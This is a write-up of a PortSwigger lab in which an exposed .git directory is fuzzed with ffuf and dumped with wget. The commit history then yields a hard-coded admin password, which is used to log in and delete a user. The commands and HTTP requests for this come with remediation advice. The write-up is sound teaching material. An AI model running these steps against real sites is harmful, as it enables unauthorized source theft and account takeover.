# PortSwigger Lab: Information disclosure in version control history

# TAGS: Information Disclosure, Git, Version Control, ffuf

Category: Information Disclosure
Date: November 1, 2026
Day: Sunday
Link: https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-in-version-control-history
Published: Ready
Status: Done

---

## Intro

This is the fifth lab in the **Information Disclosure** series. The application exposes its **`.git` directory** to the web, which means the entire repository — source code and commit history — can be downloaded. The history contains a commit called **"Remove admin password from config"**, and the diff still shows the hard-coded admin password that was replaced.

This write-up covers the reconnaissance, the exploitation steps, the root cause, the real-world impact, and how to prevent it.

---

## Reconnaissance:

#### Lab Description Lookup:

The lab description says the application discloses sensitive information through its version control history. The goal is to obtain the **administrator password**, log in and delete the user `carlos`.

The first test is the standard Git metadata path:

```http
GET /.git/HEAD HTTP/2
Host: 0a650056034de61380059ee900be0089.web-security-academy.net
```

```http
HTTP/2 200 OK

ref: refs/heads/master
```

That single response confirms the repository is exposed. The config file even leaks the author:

```http
GET /.git/config HTTP/2
Host: 0a650056034de61380059ee900be0089.web-security-academy.net
```

```text
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[user]
	email = carlos@carlos-montoya.net
	name = Carlos Montoya
```

---

## Exploitation:

#### Step 1: Find the `.git` directory

The official solution browses straight to `/.git`. To find it systematically (and to have a reusable method), I used **ffuf** with a small wordlist:

```bash
ffuf -w wl_git.txt -u https://0a650056034de61380059ee900be0089.web-security-academy.net/FUZZ -mc all -fc 404
```

```text
.git/config             [Status: 200, Size: 157, Words: 14, Lines: 9]
.git/HEAD               [Status: 200, Size: 23, Words: 2, Lines: 2]
.git/logs/HEAD          [Status: 200, Size: 369, Words: 23, Lines: 3]
.git/index              [Status: 200, Size: 225, Words: 2, Lines: 3]
.git/                   [Status: 200, Size: 1201, Words: 256, Lines: 27]
```

The `.git/` hit with a directory listing is the confirmation. The same discovery can be done with the script `scripts/git_disclosure.py`, which also dumps and analyses the repo.

#### Step 2: Dump the repository

The official way is to download the whole directory:

```bash
wget -r https://0a650056034de61380059ee900be0089.web-security-academy.net/.git/
```

Because `wget -r` saves an `index.html` for every directory listing, those files end up inside `.git` and confuse Git (`fatal: bad object refs/heads/index.html`). Removing them fixes it:

```bash
find . -name index.html -delete
```

#### Step 3: Inspect the commit history

```bash
git log --all --oneline
```

```text
2bdb747 Remove admin password from config
b554ca7 Add skeleton admin panel
```

The commit message is a giant hint. Looking at the diff:

```bash
git show 2bdb747
```

```diff
commit 2bdb747b4f4b7351e40b8f23f72e541bf4ac19be
Author: Carlos Montoya <carlos@carlos-montoya.net>
Date:   Tue Jun 23 14:05:07 2020 +0000

    Remove admin password from config

diff --git a/admin.conf b/admin.conf
index dc0817f..21d23f1 100644
--- a/admin.conf
+++ b/admin.conf
@@ -1 +1 @@
-ADMIN_PASSWORD=jtipn5v9d8iue7bjkpgo
+ADMIN_PASSWORD=env('ADMIN_PASSWORD')
```

The password was replaced by an environment variable, but the **old value is still in the diff**:

```text
jtipn5v9d8iue7bjkpgo
```

`scripts/git_disclosure.py` automates the discovery, the dump, the `index.html` cleanup and the diff search, printing exactly this line.

#### Step 4: Log in as administrator and delete carlos

```http
POST /login HTTP/2
Host: 0a650056034de61380059ee900be0089.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

csrf=<TOKEN>&username=administrator&password=jtipn5v9d8iue7bjkpgo
```

```http
HTTP/2 302 Found
Location: /my-account?id=administrator
```

Then:

```http
GET /admin/delete?username=carlos HTTP/2
Host: 0a650056034de61380059ee900be0089.web-security-academy.net
Cookie: session=<ADMIN-SESSION>
```

```http
HTTP/2 302 Found
Location: /admin
```

The lab showed **"Congratulations, you solved the lab!"**.

---

## Root Cause

The `.git` directory was **deployed to the web root** and directory listing was enabled, so the whole repository — including its history — is downloadable. Git keeps every version of every file, so a secret that was "removed" in a later commit is still present in the older commit and its diff.

Removing the password from the current file did not remove it from the history.

---

## Impact

An attacker obtains the full source code, internal paths, author identities and any secret ever committed — here, the **administrator password**. That leads directly to admin account takeover and destructive actions. In real applications, leaked `.git` directories regularly expose API keys, database credentials and the entire codebase.

---

## Remediation

To prevent this issue, applications should:

- **Never deploy `.git`** (or `.svn`, `.hg`, `.env`, backup files) to the web root;
- Block access to `.git` at the web server/proxy level;
- Disable directory listing;
- **Rotate any secret that was ever committed** — removing it from the latest commit is not enough;
- Add CI/CD checks that fail if VCS metadata would be deployed;
- Use a secret scanner (e.g. gitleaks, trufflehog) on the repository and history.

---

## Key Takeaways

1. An exposed `.git` means full source code **and full history** disclosure.
2. A secret removed in a later commit is still recoverable from the history.
3. `ffuf` with a small wordlist quickly confirms `.git/HEAD` and `.git/config`.
4. `wget -r` works, but the `index.html` files from directory listings must be removed before using Git.

---

## References

- [PortSwigger — Information disclosure](https://portswigger.net/web-security/information-disclosure)
- [PortSwigger — Information disclosure in version control history (lab)](https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-in-version-control-history)
- [OWASP — Improper Error Handling](https://owasp.org/www-community/Improper_Error_Handling)

---

## Disclaimer

This write-up was created for educational purposes only. All testing was performed in an authorized PortSwigger Web Security Academy laboratory environment. Never test systems without explicit authorization.

This article was written with the assistance of artificial intelligence tools for text review, structure, and grammar correction. However, the entire testing process, technical analysis, vulnerability exploitation, and conclusions presented are the sole responsibility of the author and are based on tests performed in a controlled environment provided by the PortSwigger Web Security Academy.
